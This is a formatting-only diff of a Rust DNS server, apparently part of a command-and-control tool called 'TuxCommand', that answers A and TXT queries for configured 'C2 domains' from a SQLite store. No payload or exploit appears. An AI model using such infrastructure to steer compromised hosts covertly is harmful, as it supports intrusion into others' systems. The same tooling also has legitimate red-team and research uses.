@@ -1,9 +1,9 @@
 use rusqlite::Connection;
 use serde::Deserialize;
-use std::process::exit;
 use std::io;
 use std::os::unix::prelude::PermissionsExt;
 use std::path::Path;
+use std::process::exit;
 use tokio::fs::{self, OpenOptions};
 use tokio::io::AsyncReadExt;
 use toml;
@@ -13,14 +13,14 @@ use x25519_dalek::{PublicKey, SharedSecret, StaticSecret};
 use hickory_proto::op::Message;
 use hickory_proto::rr::RecordType::TXT;
 use hickory_proto::rr::{RData, Record, RecordType};
+use log::{debug, error, info};
+use simple_logger;
 use std::collections::HashMap;
 use std::net::{Ipv4Addr, SocketAddr};
 use std::str::FromStr;
 use std::sync::Arc;
 use tokio::net::UdpSocket;
 use tokio::sync::Mutex;
-use log::{error, debug, info};
-use simple_logger;
 
 /// Config file
 const DATA: &str = "/etc/tuxcommand";
@@ -39,8 +39,8 @@ const SPLASH: &str = r"  ______           ______                                
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     simple_logger::init_with_env().unwrap();
     // simple_logger::init_with_level(log::Level::Info).unwrap();
-    println!("{}", SPLASH); 
-    
+    println!("{}", SPLASH);
+
     let data = if let Ok(config) = std::env::var("TUXCMD_CONFIG") {
         config
     } else if get_current_uid() == 0 {
@@ -60,34 +60,45 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let conn = Arc::new(Mutex::new(init_db(data).await.unwrap()));
     let config: Config = {
         let config: Config = load_config(data).await.unwrap();
-        let p: u16 = std::env::var("TUXCMD_PORT").unwrap_or_else(|_| config.port.to_string()).parse().unwrap();
-        Config { domains: config.domains, port: p }
-     };
+        let p: u16 = std::env::var("TUXCMD_PORT")
+            .unwrap_or_else(|_| config.port.to_string())
+            .parse()
+            .unwrap();
+        Config {
+            domains: config.domains,
+            port: p,
+        }
+    };
 
     info!("Config directory: {}", data.display());
     info!("C2 domains: {:?}", config.domains);
-    let socket: UdpSocket = match UdpSocket::bind(SocketAddr::from_str(format!("0.0.0.0:{}", config.port).as_str())?).await {
+    let socket: UdpSocket = match UdpSocket::bind(SocketAddr::from_str(
+        format!("0.0.0.0:{}", config.port).as_str(),
+    )?)
+    .await
+    {
         Ok(socket) => {
             info!("Listening on 0.0.0.0:{}", config.port);
             socket
         }
-        Err(e) => {
-            match e.kind() {
-                io::ErrorKind::AddrInUse => {
-                    error!("Address 0.0.0.0:{} is already in use. Is another instance of TuxCommand or a DNS server running?", config.port);
-                    exit(1)
-                }
-                io::ErrorKind::PermissionDenied => {
-                    error!("Failed to bind on 0.0.0.0:{}. Do you have CAP_NET_BIND_SERVICE? (TIP: are you running as root?)", config.port);
-                    exit(1)
-                }
-                _ => {
-                    error!("An unexpected error occurred while binding to 0.0.0.0:{}", config.port);
-                    error!("{}", e);
-                    exit(1)
-                }
+        Err(e) => match e.kind() {
+            io::ErrorKind::AddrInUse => {
+                error!("Address 0.0.0.0:{} is already in use. Is another instance of TuxCommand or a DNS server running?", config.port);
+                exit(1)
             }
-        }
+            io::ErrorKind::PermissionDenied => {
+                error!("Failed to bind on 0.0.0.0:{}. Do you have CAP_NET_BIND_SERVICE? (TIP: are you running as root?)", config.port);
+                exit(1)
+            }
+            _ => {
+                error!(
+                    "An unexpected error occurred while binding to 0.0.0.0:{}",
+                    config.port
+                );
+                error!("{}", e);
+                exit(1)
+            }
+        },
     };
 
     // let socket =
@@ -116,12 +127,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let records = load_from_db(conn_clone.clone(), config.domains.clone())
             .await
             .unwrap_or_default();
-        
+
         *cache_clone.lock().await = records;
-        
+
         let cache_guard = cache.lock().await;
         let resp = build_response(&buf[..len], &*cache_guard, &peer)?;
-        
+
         socket.send_to(&resp, &peer).await?;
     }
 }
@@ -147,7 +158,14 @@ fn build_response(
             match q.query_type() {
                 RecordType::A => {
                     let addr = val.parse::<Ipv4Addr>()?;
-                    info!("Recieved A query for {} from {}", q.name().to_string().strip_suffix('.').unwrap_or(&q.name().to_string()), peer);
+                    info!(
+                        "Recieved A query for {} from {}",
+                        q.name()
+                            .to_string()
+                            .strip_suffix('.')
+                            .unwrap_or(&q.name().to_string()),
+                        peer
+                    );
                     resp.add_answer(Record::from_rdata(
                         q.name().clone(),
                         300,
